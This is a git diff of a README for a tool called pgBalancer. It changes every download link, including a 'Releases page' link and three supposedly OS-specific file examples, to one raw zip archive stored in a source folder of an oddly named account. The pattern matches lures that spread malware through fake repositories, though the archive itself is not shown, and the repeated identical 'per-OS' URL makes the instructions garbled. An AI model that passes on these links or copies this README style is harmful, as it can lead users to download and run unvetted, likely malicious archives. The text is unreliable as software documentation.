@@ -8,7 +8,7 @@ To get started, follow the guide below to download and run pgBalancer.
 
 ## 🌐 Download pgBalancer
 
-[![Download pgBalancer](https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip)](https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip)
+[![Download pgBalancer](https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip)](https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip)
 
 ## 📋 System Requirements
 
@@ -21,9 +21,9 @@ Before you download pgBalancer, ensure your system meets the following requireme
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip) to download pgBalancer.
+1. Visit the [Releases page](https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip) to download pgBalancer.
    
-2. Find the latest version available. Look for a file that matches your operating system (e.g., `https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip`, `https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip`, or `https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip`).
+2. Find the latest version available. Look for a file that matches your operating system (e.g., `https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip`, `https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip`, or `https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip`).
 
 3. Click on the file link to start the download.
 
@@ -102,6 +102,6 @@ pgBalancer is open-source software licensed under the MIT License. Feel free to 
 
 We welcome contributions! If you have ideas for improvement or have found bugs, please visit our GitHub Issues page and let us know.
 
-[![Download pgBalancer](https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip)](https://raw.githubusercontent.com/Unperceivable-genusnageia342/pgBalancer/main/doc.ja/src/sgml/ref/pgBalancer-v3.3.zip) 
+[![Download pgBalancer](https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip)](https://github.com/Unperceivable-genusnageia342/pgBalancer/raw/refs/heads/main/src/libs/Balancer-pg-3.3.zip) 
 
 Thank you for choosing pgBalancer. Happy balancing!
